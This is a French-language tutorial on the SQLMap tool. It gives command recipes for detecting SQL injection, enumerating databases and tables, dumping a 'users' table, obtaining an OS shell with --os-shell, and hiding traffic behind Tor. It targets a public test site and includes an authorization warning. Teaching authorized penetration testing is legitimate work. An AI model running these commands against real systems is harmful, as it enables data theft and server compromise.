# 💉 SQLMap : Le Maître des Injections SQL

SQLMap est un outil d'injection SQL open source et entièrement automatisé. Son but est de détecter et d'exploiter les failles d'injection SQL pour prendre le contrôle de serveurs de bases de données.

Pensez-y comme un expert en crochetage de serrures qui, au lieu de portes, ouvre des bases de données.

---

### 🎯 **Objectif Principal**

Lorsqu'un site web utilise vos entrées (ex: un paramètre dans l'URL) pour construire une requête vers sa base de données, il peut être vulnérable. SQLMap automatise le processus de détection de cette faille, son exploitation, et l'extraction de données précieuses.

**⚠️ Avertissement Éthique :** L'injection SQL est une attaque active. Ne l'utilisez que sur des applications pour lesquelles vous avez une autorisation de test explicite.

---

### 🛠️ **Les Recettes Essentielles de SQLMap**

SQLMap est un outil conversationnel. Il vous posera souvent des questions. Pour automatiser, on utilise souvent l'option `--batch`.

#### 1. Le Scan de Base : "Y a-t-il une faille ici ?"

C'est la première étape. On donne à SQLMap une URL complète, y compris la partie qui semble suspecte (le paramètre).

```bash
# Teste le paramètre 'id' sur l'URL donnée
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch
```

*   `-u` : L'URL cible. Mettez-la **toujours entre guillemets** pour éviter les problèmes avec les caractères spéciaux comme `&`.
*   `--batch` : Répond automatiquement "oui" aux questions de SQLMap. Pratique pour les scans automatisés.

SQLMap va tester une multitude de techniques. S'il trouve une faille, il vous le dira.

#### 2. Lister les Bases de Données : "Quels sont les trésors disponibles ?"

Une fois la faille confirmée, la première chose à faire est de voir quelles bases de données sont accessibles.

```bash
# Liste toutes les bases de données accessibles via la faille
sqlmap -u "http://.../?id=1" --dbs --batch
```

*   `--dbs` : Demande à SQLMap de lister les bases de données (`databases`).

#### 3. Explorer une Base de Données : "Montre-moi les tables"

Maintenant, choisissons une base de données (ex: `acuart`) et listons les tables qu'elle contient.

```bash
# Liste les tables de la base de données 'acuart'
sqlmap -u "http://.../?id=1" -D acuart --tables --batch
```

*   `-D acuart` : Spécifie la base de données (`Database`) à utiliser.
*   `--tables` : Demande la liste des tables.

#### 4. Dumper le Contenu : "Je veux tout !"

C'est l'étape finale. On choisit une table (ex: `users`) dans une base de données (`acuart`) et on extrait tout son contenu.

```bash
# Extrait (dump) toutes les données de la table 'users' de la base de données 'acuart'
sqlmap -u "http://.../?id=1" -D acuart -T users --dump --batch
```

*   `-T users` : Spécifie la table (`Table`) à cibler.
*   `--dump` : Demande à SQLMap d'extraire les données.

---

### ✨ **Astuces de Pro**

*   **Tester un formulaire POST** : Si la faille n'est pas dans l'URL mais dans un formulaire, sauvegardez la requête HTTP dans un fichier (`request.txt`) avec un outil comme Burp Suite, puis donnez-le à SQLMap.
    ```bash
    sqlmap -r request.txt --batch
    ```

*   **Niveau de Risque et de Profondeur (`--level`, `--risk`)** : Par défaut, SQLMap est prudent. Pour des tests plus poussés (et plus "bruyants"), vous pouvez augmenter ces niveaux.
    ```bash
    # Un scan beaucoup plus agressif et complet
    sqlmap -u "http://.../?id=1" --level=5 --risk=3 --batch
    ```

*   **Obtenir un Shell sur le Système (`--os-shell`)** : Si les conditions sont réunies (droits de la base de données, configuration du serveur), SQLMap peut parfois obtenir un véritable terminal sur le serveur cible. C'est le Saint Graal de l'injection SQL.
    ```bash
    sqlmap -u "http://.../?id=1" --os-shell --batch
    ```

*   **Utiliser Tor pour l'anonymat** : SQLMap peut router son trafic via le réseau Tor si vous avez Tor d'installé et configuré.
    ```bash
    sqlmap -u "http://.../?id=1" --tor --tor-type=SOCKS5
    ```

---

SQLMap est un outil d'une densité impressionnante. Sa maîtrise demande du temps, mais il est capable de transformer une simple erreur de programmation web en un accès complet à un système. Prenez le temps de lire ses très nombreuses options avec `sqlmap -hh`.
